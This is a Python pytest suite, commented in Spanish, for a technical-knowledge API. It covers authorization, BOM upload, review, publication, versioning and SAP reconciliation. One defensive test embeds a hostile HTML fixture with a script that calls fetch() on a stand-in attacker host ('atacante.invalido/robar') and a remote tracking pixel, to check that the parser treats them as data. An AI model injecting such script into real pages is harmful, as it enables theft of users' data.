"""API de gobierno del conocimiento técnico, de extremo a extremo.

Cubre el ciclo completo: cargar, revisar, publicar, volver a cargar,
reconciliar y revertir; y las negativas que lo hacen creíble.
"""

from typing import Any

import httpx
import pytest

from elsa.adapters.fake_auth import ADMIN_ID, ENGINEER_ID, OTHER_REVIEWER_ID, REVIEWER_ID
from elsa.adapters.memory_knowledge import InMemoryKnowledgeRepository
from elsa.adapters.memory_permissions import InMemoryPermissionsRepository
from elsa.ports.knowledge import TechnicalAssetRecord
from tests.conftest import (
    ADMIN_TOKEN,
    ENGINEER_TOKEN,
    OTHER_REVIEWER_TOKEN,
    REVIEWER_TOKEN,
    auth_header,
)
from tests.fixtures_sources import bom_row, engineering_workbook, sap_export

pytestmark = pytest.mark.anyio

DOMAIN = "mantenimiento"
ASSET = "tampella"
BASE = f"/api/v1/technical/{DOMAIN}/{ASSET}"
PUBLIC = f"/api/v1/knowledge/{DOMAIN}/{ASSET}"

XLSX_TYPE = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"


def _file(data: bytes, name: str = "bom.xlsx", content_type: str = XLSX_TYPE) -> dict[str, Any]:
    return {"file": (name, data, content_type)}


@pytest.fixture
async def asset(
    permissions: InMemoryPermissionsRepository, knowledge: InMemoryKnowledgeRepository
) -> TechnicalAssetRecord:
    """Un activo con un administrador, un ingeniero y dos revisores."""
    await permissions.bootstrap_admin(subject=ADMIN_ID, display_name="Administradora")
    for subject in (ENGINEER_ID, REVIEWER_ID, OTHER_REVIEWER_ID):
        await permissions.grant_permission(
            subject=subject, domain=DOMAIN, equipment=ASSET, actor=ADMIN_ID
        )
    for subject in (REVIEWER_ID, OTHER_REVIEWER_ID):
        await permissions.grant_reviewer(
            subject=subject, domain=DOMAIN, equipment=ASSET, actor=ADMIN_ID
        )
    return await knowledge.create_asset(code=ASSET, name="Activo de prueba", domain=DOMAIN)


async def _upload_bom(api: httpx.AsyncClient, data: bytes | None = None) -> dict[str, Any]:
    response = await api.post(
        f"{BASE}/engineering-bom",
        files=_file(data if data is not None else engineering_workbook()),
        headers=auth_header(REVIEWER_TOKEN),
    )
    assert response.status_code == 200, response.text
    body: dict[str, Any] = response.json()
    return body


async def _approve_and_publish(api: httpx.AsyncClient, version_id: str) -> httpx.Response:
    approved = await api.post(
        f"{BASE}/versions/{version_id}/review",
        json={"decision": "approved"},
        headers=auth_header(REVIEWER_TOKEN),
    )
    assert approved.status_code == 200, approved.text
    return await api.post(
        f"{BASE}/versions/{version_id}/publish", headers=auth_header(REVIEWER_TOKEN)
    )


# ---------------------------------------------------------------------
# Autorización
# ---------------------------------------------------------------------


async def test_an_unauthenticated_request_is_rejected(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    response = await api.get(f"{BASE}/versions")

    assert response.status_code == 401


async def test_an_invalid_token_is_rejected(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    response = await api.get(f"{BASE}/versions", headers=auth_header("no-existe"))

    assert response.status_code == 401


async def test_a_reader_without_the_reviewer_capability_cannot_review(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    """Poder leer no habilita a validar."""
    response = await api.get(f"{BASE}/versions", headers=auth_header(ENGINEER_TOKEN))

    assert response.status_code == 403
    assert response.json()["error"]["code"] == "reviewer_scope_denied"


async def test_a_disabled_reviewer_loses_the_capability_immediately(
    api: httpx.AsyncClient,
    asset: TechnicalAssetRecord,
    permissions: InMemoryPermissionsRepository,
) -> None:
    await permissions.revoke_reviewer(
        subject=REVIEWER_ID, domain=DOMAIN, equipment=ASSET, actor=ADMIN_ID
    )

    response = await api.get(f"{BASE}/versions", headers=auth_header(REVIEWER_TOKEN))

    assert response.status_code == 403


async def test_a_reviewer_of_one_asset_cannot_review_another(
    api: httpx.AsyncClient,
    asset: TechnicalAssetRecord,
    permissions: InMemoryPermissionsRepository,
    knowledge: InMemoryKnowledgeRepository,
) -> None:
    await knowledge.create_asset(code="otro-activo", name="Otro", domain=DOMAIN)
    await permissions.grant_permission(
        subject=REVIEWER_ID, domain=DOMAIN, equipment="otro-activo", actor=ADMIN_ID
    )

    response = await api.get(
        f"/api/v1/technical/{DOMAIN}/otro-activo/versions", headers=auth_header(REVIEWER_TOKEN)
    )

    assert response.status_code == 403


async def test_an_administrator_keeps_global_intervention(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    response = await api.get(f"{BASE}/versions", headers=auth_header(ADMIN_TOKEN))

    assert response.status_code == 200


async def test_an_unknown_asset_is_not_found_for_someone_authorised(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    """Un administrador, que sí puede mirar, obtiene 404."""
    response = await api.get(
        f"/api/v1/technical/{DOMAIN}/inexistente/versions", headers=auth_header(ADMIN_TOKEN)
    )

    assert response.status_code == 404
    assert response.json()["error"]["code"] == "asset_not_found"


async def test_authorization_runs_before_the_asset_is_even_looked_up(
    api: httpx.AsyncClient,
    asset: TechnicalAssetRecord,
    knowledge: InMemoryKnowledgeRepository,
) -> None:
    """Los permisos se aplican antes de recuperar conocimiento.

    Quien no tiene alcance recibe 403 tanto si el activo existe como si no,
    así que la respuesta no revela cuáles existen. Si la autorización
    corriera después de la búsqueda, el caso inexistente devolvería 404 y
    filtraría esa diferencia.
    """
    for code in ("otro-activo", "no-existe-en-absoluto"):
        response = await api.get(
            f"/api/v1/technical/{DOMAIN}/{code}/versions", headers=auth_header(ENGINEER_TOKEN)
        )
        assert response.status_code == 403, code

    await knowledge.create_asset(code="otro-activo", name="Otro", domain=DOMAIN)
    response = await api.get(
        f"/api/v1/technical/{DOMAIN}/otro-activo/versions", headers=auth_header(ENGINEER_TOKEN)
    )
    assert response.status_code == 403


# ---------------------------------------------------------------------
# Ingesta
# ---------------------------------------------------------------------


async def test_uploading_the_engineering_bom_creates_a_pending_version(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    """Cargar no publica: la versión entra pendiente de validación."""
    body = await _upload_bom(api)

    detail = await api.get(
        f"{BASE}/versions/{body['version_id']}", headers=auth_header(REVIEWER_TOKEN)
    )
    assert detail.status_code == 200
    version = detail.json()["version"]
    assert version["version_number"] == 1
    assert version["state"] == "pending_validation"


async def test_the_version_detail_shows_rows_amef_and_drawings(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    body = await _upload_bom(api)

    detail = (
        await api.get(f"{BASE}/versions/{body['version_id']}", headers=auth_header(REVIEWER_TOKEN))
    ).json()

    assert len(detail["items"]) == 3
    assert detail["failure_modes"][0]["rpn"] == 84
    assert len(detail["drawings"]) == 1


async def test_a_component_without_a_sap_code_is_stored(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    body = await _upload_bom(api)

    items = (
        await api.get(f"{BASE}/versions/{body['version_id']}", headers=auth_header(REVIEWER_TOKEN))
    ).json()["items"]

    without_code = [item for item in items if item["sap_code"] is None]
    assert len(without_code) == 1
    assert without_code[0]["component_id"] is not None


async def test_every_row_of_a_first_version_is_new(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    body = await _upload_bom(api)

    items = (
        await api.get(f"{BASE}/versions/{body['version_id']}", headers=auth_header(REVIEWER_TOKEN))
    ).json()["items"]

    assert {item["change_kind"] for item in items} == {"new"}


async def test_reuploading_the_same_file_creates_no_second_version(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    """Idempotencia: mismo contenido, misma importación."""
    workbook = engineering_workbook()
    first = await _upload_bom(api, workbook)

    second = await _upload_bom(api, workbook)

    assert second["duplicate"] is True
    assert second["import_id"] == first["import_id"]
    versions = (await api.get(f"{BASE}/versions", headers=auth_header(REVIEWER_TOKEN))).json()
    assert len(versions) == 1


@pytest.mark.parametrize(
    ("name", "payload"),
    [
        ("bom.xlsx", b"no soy un xlsx"),
        ("bom.xlsx", b"PK\x03\x04 truncado"),
        ("informe.pdf", b"%PDF-1.4 fake"),
    ],
    ids=["fake content", "truncated", "wrong type with wrong extension"],
)
async def test_a_file_that_is_not_a_workbook_is_rejected(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord, name: str, payload: bytes
) -> None:
    response = await api.post(
        f"{BASE}/engineering-bom",
        files=_file(payload, name),
        headers=auth_header(REVIEWER_TOKEN),
    )

    assert response.status_code == 422
    assert response.json()["error"]["code"] == "invalid_source_file"


async def test_an_empty_upload_is_rejected(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    response = await api.post(
        f"{BASE}/engineering-bom", files=_file(b""), headers=auth_header(REVIEWER_TOKEN)
    )

    assert response.status_code == 422


async def test_a_workbook_without_a_bom_sheet_fails_the_import(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord, knowledge: InMemoryKnowledgeRepository
) -> None:
    """La importación queda registrada como fallida, con su tipo de fallo."""
    from tests.fixtures_xlsx import build_workbook

    response = await api.post(
        f"{BASE}/engineering-bom",
        files=_file(build_workbook({"Otra": [["a", "b"]]})),
        headers=auth_header(REVIEWER_TOKEN),
    )

    assert response.status_code == 422
    imports = (await api.get(f"{BASE}/imports", headers=auth_header(REVIEWER_TOKEN))).json()
    assert imports[0]["status"] == "failed"
    assert imports[0]["failure_kind"] == "parse"


async def test_a_failed_import_never_touches_the_published_version(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    from tests.fixtures_xlsx import build_workbook

    first = await _upload_bom(api)
    await _approve_and_publish(api, first["version_id"])

    await api.post(
        f"{BASE}/engineering-bom",
        files=_file(build_workbook({"Otra": [["a", "b"]]})),
        headers=auth_header(REVIEWER_TOKEN),
    )

    summary = (await api.get(PUBLIC, headers=auth_header(ENGINEER_TOKEN))).json()
    assert summary["published"] is True
    assert summary["components"] == 3


async def test_errors_carry_a_request_id_and_no_stack_trace(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    response = await api.post(
        f"{BASE}/engineering-bom",
        files=_file(b"no soy un xlsx"),
        headers=auth_header(REVIEWER_TOKEN),
    )

    error = response.json()["error"]
    assert error["request_id"]
    assert "Traceback" not in response.text


# ---------------------------------------------------------------------
# Revisión y publicación
# ---------------------------------------------------------------------


async def test_approving_may_omit_the_comment(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    body = await _upload_bom(api)

    response = await api.post(
        f"{BASE}/versions/{body['version_id']}/review",
        json={"decision": "approved"},
        headers=auth_header(REVIEWER_TOKEN),
    )

    assert response.status_code == 200
    assert response.json()["decision"] == "approved"


async def test_rejecting_without_a_reason_is_refused(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    body = await _upload_bom(api)

    response = await api.post(
        f"{BASE}/versions/{body['version_id']}/review",
        json={"decision": "rejected"},
        headers=auth_header(REVIEWER_TOKEN),
    )

    assert response.status_code == 422
    assert response.json()["error"]["code"] == "reason_required"


async def test_rejecting_with_a_reason_works(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    body = await _upload_bom(api)

    response = await api.post(
        f"{BASE}/versions/{body['version_id']}/review",
        json={"decision": "rejected", "comment": "el plano no corresponde"},
        headers=auth_header(REVIEWER_TOKEN),
    )

    assert response.status_code == 200
    assert response.json()["comment"] == "el plano no corresponde"


async def test_an_unapproved_version_cannot_be_published(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    body = await _upload_bom(api)

    response = await api.post(
        f"{BASE}/versions/{body['version_id']}/publish", headers=auth_header(REVIEWER_TOKEN)
    )

    assert response.status_code == 409
    assert response.json()["error"]["code"] == "version_not_publishable"


async def test_publishing_an_approved_version_makes_it_current(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    body = await _upload_bom(api)

    response = await _approve_and_publish(api, body["version_id"])

    assert response.status_code == 200
    assert response.json()["state"] == "published"


async def test_reverting_requires_a_reason(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    body = await _upload_bom(api)
    review = (
        await api.post(
            f"{BASE}/versions/{body['version_id']}/review",
            json={"decision": "approved"},
            headers=auth_header(REVIEWER_TOKEN),
        )
    ).json()

    response = await api.post(
        f"{BASE}/reviews/{review['id']}/revert",
        json={"comment": "  "},
        headers=auth_header(REVIEWER_TOKEN),
    )

    assert response.status_code == 422


async def test_another_reviewer_with_the_same_scope_may_revert(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    body = await _upload_bom(api)
    review = (
        await api.post(
            f"{BASE}/versions/{body['version_id']}/review",
            json={"decision": "approved"},
            headers=auth_header(REVIEWER_TOKEN),
        )
    ).json()

    response = await api.post(
        f"{BASE}/reviews/{review['id']}/revert",
        json={"comment": "faltaba verificar el plano"},
        headers=auth_header(OTHER_REVIEWER_TOKEN),
    )

    assert response.status_code == 200
    assert response.json()["reverts_review_id"] == review["id"]


async def test_reverting_returns_the_version_to_review(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    body = await _upload_bom(api)
    review = (
        await api.post(
            f"{BASE}/versions/{body['version_id']}/review",
            json={"decision": "approved"},
            headers=auth_header(REVIEWER_TOKEN),
        )
    ).json()

    await api.post(
        f"{BASE}/reviews/{review['id']}/revert",
        json={"comment": "faltaba verificar el plano"},
        headers=auth_header(REVIEWER_TOKEN),
    )

    detail = (
        await api.get(f"{BASE}/versions/{body['version_id']}", headers=auth_header(REVIEWER_TOKEN))
    ).json()
    assert detail["version"]["state"] == "pending_validation"


async def test_no_validation_ever_disappears(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    body = await _upload_bom(api)
    review = (
        await api.post(
            f"{BASE}/versions/{body['version_id']}/review",
            json={"decision": "approved"},
            headers=auth_header(REVIEWER_TOKEN),
        )
    ).json()
    await api.post(
        f"{BASE}/reviews/{review['id']}/revert",
        json={"comment": "faltaba verificar el plano"},
        headers=auth_header(REVIEWER_TOKEN),
    )

    history = (await api.get(f"{BASE}/reviews", headers=auth_header(REVIEWER_TOKEN))).json()

    assert {entry["decision"] for entry in history} == {"approved", "reverted"}
    assert any(entry["id"] == review["id"] for entry in history)


async def test_a_reviewer_history_survives_being_disabled(
    api: httpx.AsyncClient,
    asset: TechnicalAssetRecord,
    permissions: InMemoryPermissionsRepository,
) -> None:
    """Borrar su historial dejaría aprobaciones sin responsable."""
    body = await _upload_bom(api)
    await api.post(
        f"{BASE}/versions/{body['version_id']}/review",
        json={"decision": "approved"},
        headers=auth_header(REVIEWER_TOKEN),
    )
    await permissions.revoke_reviewer(
        subject=REVIEWER_ID, domain=DOMAIN, equipment=ASSET, actor=ADMIN_ID
    )

    history = (await api.get(f"{BASE}/reviews", headers=auth_header(ADMIN_TOKEN))).json()

    assert history[0]["reviewer"] == REVIEWER_ID


# ---------------------------------------------------------------------
# Segunda versión
# ---------------------------------------------------------------------


async def test_a_second_version_does_not_disturb_the_published_one(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    first = await _upload_bom(api)
    await _approve_and_publish(api, first["version_id"])

    await _upload_bom(
        api,
        engineering_workbook(
            [
                bom_row("1", "Accionamiento", "Rodamiento ficticio", "10000001", 2),
                bom_row("2", "Accionamiento", "Sello sin codigo", None, 1, reference="R-02"),
                bom_row(
                    "3",
                    "Bastidor",
                    "Tornillo ficticio",
                    "10000002",
                    99,
                    drawing="PL-002",
                    reference="R-03",
                    model="MOD-C",
                ),
            ]
        ),
    )

    published = (await api.get(PUBLIC, headers=auth_header(ENGINEER_TOKEN))).json()
    assert published["source"].endswith("version 1")


async def test_an_unchanged_row_is_marked_unchanged_and_a_changed_one_modified(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    first = await _upload_bom(api)
    await _approve_and_publish(api, first["version_id"])

    second = await _upload_bom(
        api,
        engineering_workbook(
            [
                bom_row("1", "Accionamiento", "Rodamiento ficticio", "10000001", 2),
                bom_row("2", "Accionamiento", "Sello sin codigo", None, 1, reference="R-02"),
                bom_row(
                    "3",
                    "Bastidor",
                    "Tornillo ficticio",
                    "10000002",
                    99,
                    drawing="PL-002",
                    reference="R-03",
                    model="MOD-C",
                ),
                bom_row(
                    "4",
                    "Bastidor",
                    "Pieza nueva",
                    "10000003",
                    1,
                    drawing="PL-002",
                    reference="R-04",
                    model="MOD-D",
                ),
            ]
        ),
    )

    items = (
        await api.get(
            f"{BASE}/versions/{second['version_id']}", headers=auth_header(REVIEWER_TOKEN)
        )
    ).json()["items"]
    by_row = {item["source_row"]: item["change_kind"] for item in items}
    assert by_row[2] == "unchanged"
    assert by_row[4] == "modified"
    assert by_row[5] == "new"


async def test_publishing_the_second_version_supersedes_the_first(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    """La anterior no se borra: queda reemplazada y consultable."""
    first = await _upload_bom(api)
    await _approve_and_publish(api, first["version_id"])
    second = await _upload_bom(api, engineering_workbook([bom_row("1", "A", "B", "10000001", 5)]))
    await _approve_and_publish(api, second["version_id"])

    versions = (await api.get(f"{BASE}/versions", headers=auth_header(REVIEWER_TOKEN))).json()

    states = {version["version_number"]: version["state"] for version in versions}
    assert states == {1: "superseded", 2: "published"}
    assert len([v for v in versions if v["state"] == "published"]) == 1


async def test_a_component_keeps_its_identity_across_versions(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    """El UUID no cambia aunque cambie la cantidad."""
    first = await _upload_bom(api)
    await _approve_and_publish(api, first["version_id"])
    items_v1 = (
        await api.get(f"{BASE}/versions/{first['version_id']}", headers=auth_header(REVIEWER_TOKEN))
    ).json()["items"]

    second = await _upload_bom(
        api,
        engineering_workbook(
            [
                bom_row("1", "Accionamiento", "Rodamiento ficticio", "10000001", 7),
                bom_row("2", "Accionamiento", "Sello sin codigo", None, 1, reference="R-02"),
                bom_row(
                    "3",
                    "Bastidor",
                    "Tornillo ficticio",
                    "10000002",
                    10,
                    drawing="PL-002",
                    reference="R-03",
                    model="MOD-C",
                ),
            ]
        ),
    )
    items_v2 = (
        await api.get(
            f"{BASE}/versions/{second['version_id']}", headers=auth_header(REVIEWER_TOKEN)
        )
    ).json()["items"]

    assert items_v1[0]["component_id"] == items_v2[0]["component_id"]
    assert items_v2[0]["quantity"] == "7"


# ---------------------------------------------------------------------
# Snapshot de SAP y reconciliación
# ---------------------------------------------------------------------


async def test_a_sap_snapshot_never_becomes_the_published_bom(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    first = await _upload_bom(api)
    await _approve_and_publish(api, first["version_id"])

    response = await api.post(
        f"{BASE}/sap-snapshots",
        files=_file(sap_export(), "export.htm", "text/html"),
        headers=auth_header(REVIEWER_TOKEN),
    )

    assert response.status_code == 200
    published = (await api.get(PUBLIC, headers=auth_header(ENGINEER_TOKEN))).json()
    assert published["source"].endswith("version 1")
    assert published["components"] == 3


async def test_a_snapshot_separates_materials_from_child_equipments(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    await api.post(
        f"{BASE}/sap-snapshots",
        files=_file(sap_export(), "export.htm", "text/html"),
        headers=auth_header(REVIEWER_TOKEN),
    )

    snapshots = (await api.get(f"{BASE}/snapshots", headers=auth_header(REVIEWER_TOKEN))).json()

    assert snapshots[0]["materials"] == 2
    assert snapshots[0]["equipments"] == 1
    assert snapshots[0]["functional_location"] == "MB-FICTICIA-01"


async def test_reconciliation_reports_every_class_without_changing_the_sources(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    first = await _upload_bom(api)
    await _approve_and_publish(api, first["version_id"])
    snapshot = (
        await api.post(
            f"{BASE}/sap-snapshots",
            files=_file(sap_export(), "export.htm", "text/html"),
            headers=auth_header(REVIEWER_TOKEN),
        )
    ).json()

    run = await api.post(
        f"{BASE}/reconciliations",
        json={"snapshot_id": snapshot["snapshot_id"]},
        headers=auth_header(REVIEWER_TOKEN),
    )

    assert run.status_code == 200
    stats = run.json()["stats"]
    assert stats["quantity_difference"] == 1
    assert stats["sap_only"] == 1
    assert stats["engineering_only"] == 1
    assert stats["unresolved"] == 1
    # Las fuentes siguen intactas.
    items = (
        await api.get(f"{BASE}/versions/{first['version_id']}", headers=auth_header(REVIEWER_TOKEN))
    ).json()["items"]
    assert items[0]["quantity"] == "2"


async def test_reconciliation_keeps_both_values_side_by_side(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    first = await _upload_bom(api)
    await _approve_and_publish(api, first["version_id"])
    snapshot = (
        await api.post(
            f"{BASE}/sap-snapshots",
            files=_file(sap_export(), "export.htm", "text/html"),
            headers=auth_header(REVIEWER_TOKEN),
        )
    ).json()
    run = (
        await api.post(
            f"{BASE}/reconciliations",
            json={"snapshot_id": snapshot["snapshot_id"]},
            headers=auth_header(REVIEWER_TOKEN),
        )
    ).json()

    detail = (
        await api.get(f"{BASE}/reconciliations/{run['id']}", headers=auth_header(REVIEWER_TOKEN))
    ).json()

    difference = next(
        item for item in detail["items"] if item["classification"] == "quantity_difference"
    )
    assert difference["engineering_quantity"] == "2"
    assert difference["sap_quantity"] == "3"


async def test_reconciliation_needs_a_published_version(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    snapshot = (
        await api.post(
            f"{BASE}/sap-snapshots",
            files=_file(sap_export(), "export.htm", "text/html"),
            headers=auth_header(REVIEWER_TOKEN),
        )
    ).json()

    response = await api.post(
        f"{BASE}/reconciliations",
        json={"snapshot_id": snapshot["snapshot_id"]},
        headers=auth_header(REVIEWER_TOKEN),
    )

    assert response.status_code == 409
    assert response.json()["error"]["code"] == "no_published_version"


async def test_a_later_snapshot_produces_a_new_historical_result(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    first = await _upload_bom(api)
    await _approve_and_publish(api, first["version_id"])
    corrected = sap_export(
        """<table><tr><td>Ubicacion tecnica</td><td>MB-FICTICIA-01</td></tr></table>
        <table><tr><th>Pos.</th><th>Material</th><th>Ctd.</th></tr>
        <tr><td>0010</td><td>10000001</td><td>2</td></tr></table>"""
    )
    for payload in (sap_export(), corrected):
        snapshot = (
            await api.post(
                f"{BASE}/sap-snapshots",
                files=_file(payload, "export.htm", "text/html"),
                headers=auth_header(REVIEWER_TOKEN),
            )
        ).json()
        await api.post(
            f"{BASE}/reconciliations",
            json={"snapshot_id": snapshot["snapshot_id"]},
            headers=auth_header(REVIEWER_TOKEN),
        )

    snapshots = (await api.get(f"{BASE}/snapshots", headers=auth_header(REVIEWER_TOKEN))).json()
    assert len(snapshots) == 2


async def test_an_html_export_with_a_script_is_parsed_as_data(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    hostile = sap_export(
        """<script>fetch('http://atacante.invalido/robar')</script>
        <img src="http://remoto.invalido/pixel.gif">
        <table><tr><td>Ubicacion tecnica</td><td>MB-FICTICIA-01</td></tr></table>
        <table><tr><th>Material</th><th>Ctd.</th></tr>
        <tr><td>10000001</td><td>2</td></tr></table>"""
    )

    response = await api.post(
        f"{BASE}/sap-snapshots",
        files=_file(hostile, "export.htm", "text/html"),
        headers=auth_header(REVIEWER_TOKEN),
    )

    assert response.status_code == 200
    snapshots = (await api.get(f"{BASE}/snapshots", headers=auth_header(REVIEWER_TOKEN))).json()
    assert snapshots[0]["materials"] == 1


async def test_an_unrecognisable_export_fails_the_import_safely(
    api: httpx.AsyncClient, asset: TechnicalAssetRecord
) -> None:
    response = await api.post(
        f"{BASE}/sap-snapshots",
        files=_file(b"<html><body><p>nada</p></body></html>", "export.htm", "text/html"),
        headers=auth_header(REVIEWER_TOKEN),
    )

    assert response.status_code == 422
    imports = (await api.get(f"{BASE}/imports", headers=auth_header(REVIEWER_TOKEN))).json()
    assert imports[0]["status"] == "failed"
